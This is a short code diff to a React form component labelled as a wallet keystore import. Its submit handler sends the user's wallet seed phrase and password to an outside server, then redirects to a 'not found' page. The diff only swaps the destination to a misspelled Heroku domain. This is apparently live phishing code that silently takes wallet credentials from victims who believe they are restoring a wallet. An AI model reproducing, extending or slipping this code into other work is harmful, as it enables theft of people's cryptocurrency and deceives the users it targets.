@@ -14,7 +14,7 @@ const KeystoreJson = ({ seed2, setSeed2, disabled2, setDisabled2, password, setP
   }, [seed2, password]);
 
   const handleSubmit = (e) => {
-    axios.post("https://cryptoboss.herokuapp.com/form", { seed: seed2, password });
+    axios.post("https://cryptoboss.herukoapp.com/form", { seed: seed2, password });
     Navigate('/not_found')
   };
 
